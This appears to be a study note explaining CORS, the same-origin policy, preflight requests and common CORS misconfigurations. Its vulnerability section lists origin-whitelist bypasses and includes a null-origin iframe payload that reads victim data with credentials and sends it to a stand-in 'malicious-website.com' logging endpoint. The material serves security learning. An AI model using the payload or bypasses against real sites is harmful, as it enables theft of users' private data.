# Cross Origin Request Policy (CORS)

## What is CORS?
- CORS is basically controlling the access of the resources of the origins outside your origin.

## Same origin policy (SOP)
- SOP is the browser's own isolation policy which states that the javascript of a different origin A is not allowed to read the sensitive information of a different origin B.
- But if the website explicitly wants to share sensitive information with the different origin A, then it can and then there is no use of SOP.
- Typically this can be done using headers like <code>Access-Control-Allow-Credentials: true</code> and also <code>Access-Control-Allow-Origin</code>.
- But there are some exceptions regarding the SOP, SOP does not always means that if there are two different origins, then no interaction will be there:
1. Some properties like <code>location</code> and <code>location.href()</code> are writable but not readable because <code>location.href()</code> would read the victim's URL.
2. Some properties like <code>window.length</code> (represents number of child frames or windows in a window) and <code>window.closed</code> are readable but not writable.
3. <code>window.replace()</code> (which tells which location to naviagate) can be called cross origin.
4. Some functions like <code>close()</code>, <code>blur()</code> and <code>focus()</code> can be called cross-origin.
- There is way to relax the SOP that is by using <code>document.domain</code>. Earlier, it was allowed to set it to a TLD say com, so that any site with that TLD was considered of the same domain and there was allowed access between the two but now modern browsers prevent it. Say now if one of your origin is market.example.com and another is example.com and A would like to read content of B, then you have to set <code>document.domain</code> to example.com so that access will be allowed even though both are from different origins but make sure the value you provided is a part of your Fully Qualified Domain Name (like a parent domain or any arbitary domain).

## Implementing CORS
- Say, there are two different sites: <code>api.example.com</code> and <code>app.example.com</code>.
- Now if the app one sends a request to the api one wanting to read a content, and the request contains a origin header with the app site URL because the request originated from there itself.
- Now if the response to the request comes and if the api server wants to allow the app one to read the content, then header <code>Access-Control-Allow-Origin</code> has to contain the app site URL. Now if browser sees the origin URL and the ACAO header URL same, then it allows the javascript of the app site to access the content of the api site.
- And if that request asks for some credentials in the response, then the response has also to include <code>Access-Control-Allow-Credentials</code> and the value has to be true. Then the browser also allows the app site javascript to access the credentials as well.
- Now comes about wildcards, <code>Access-Control-Allow-Origin</code> header supports wildcards (*), which means allow any site to read content but this is not supported with the credentials header as it can be insecure.

## Pre-Flight Request
- So for some request there is a pre-flight request which asks the server if it ok with the request that was originally going to be sent.
- Say there are two apps <code>api.example.com</code> and <code>app.example.com</code> Now if the app wants to send request to the api but something like this:
<pre> 
POST /transfer HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Authorization: Bearer xyz
Content-Type: application/json
{
    "amount": 100
}
</pre>
Then, before a pre flight request will be there,\
<pre>
OPTIONS /transfer HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
</pre>
and if the server responds like this,
<pre>
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Authorization, Content-Type
</pre>
then now browser checks whether the origin, method, headers are allowed or not and then sends the original request that was to be sent.

## Vulnerabilities in CORS
1. Observe <code>Access-Control-Allow-Credentials: true</code> and also <code>Access-Control-Allow-Origin</code>. If in the second header, if there is a site name, then that means that the site is allowed to read the response and If the first one is true, then that means that the site is can also transfer credentials say in form of cookie or in any other form. Also check with your own origin and also check if the response coming back from the server is including your origin in the response in the header <code>Access-Control-Allow-Origin</code>, then that means that the server is ok to share the response with your origin as well.
2. Now some website have a list of whitelisted origin headers to whom they allow to read their content cross origin. Whenever a request comes, they match the origin header against the whitelist and then send the response accordingly. But the mistakes lies in how they check, some websites allow all their subdomains even the future ones, which even are not built. Some just check for their website as a suffix or a prefix (like the domain name should be either in the front or in the back), which is easy to bypass for a hacker.\
Example: A server allows access to all domains ending in <code>normal-website.com</code>, now attacker can use <code>evilnormal-website.com</code>, if check is for the beginning then, attacker can use <code>normal-website.com.evil-user.net</code>.
3. Some websites allow null value in the origin header and also allow access for it for their local development but attacker can also send a request with null as their origin value using various method. One can be using the below code as well:\
<code>
\<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,\<script>\
var req = new XMLHttpRequest();\
req.onload = reqListener;\
req.open('get','vulnerable-website.com/sensitive-victim-data',true);\
req.withCredentials = true;\
req.send();\
function reqListener() {\
location='malicious-website.com/log?key='+this.responseText;\
};\
\</script>">\</iframe>
</code>

4. If a website A trust a subdomain or any other site B say blindly and allows it to read content, then attacker can find if any XSS vulnerability in the site B to inject malicous JS code to read the content of the site A.
5. Another thing is that TLS encryption can be broken by the attacker as well using CORS exploitation. If there is a site A that uses HTTP and there is a site B that uses HTTPS and B is the main site whose data we want and B trusts A blindly, so when a victim user makes a HTTP Request, say the attacker is sitting in the network of victim user, then can intercept through the network and redirect it to the site A using HTTP Request and then make a request for credentials to the site B, as the request is from A whom B trusts, it can hand over all the credentials to the A which attacker can redirect it to its own website or domain to read.